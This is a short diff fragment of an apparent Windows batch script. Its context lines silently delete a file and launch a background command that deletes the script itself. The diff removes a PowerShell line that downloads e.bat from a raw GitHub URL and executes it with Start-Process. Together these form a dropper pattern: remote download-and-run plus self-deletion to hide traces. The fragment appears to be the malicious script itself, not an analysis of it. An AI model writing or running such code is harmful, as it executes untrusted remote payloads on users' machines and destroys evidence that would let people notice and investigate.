@@ -28,5 +28,3 @@ del /q "%file%"
 start /b "" cmd /c del "%~f0"&exit
 
 endlocal
-
- $out="C:e.bat"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sxzzzy/blue/main/e.bat -OutFile $out; Start-Process $out;
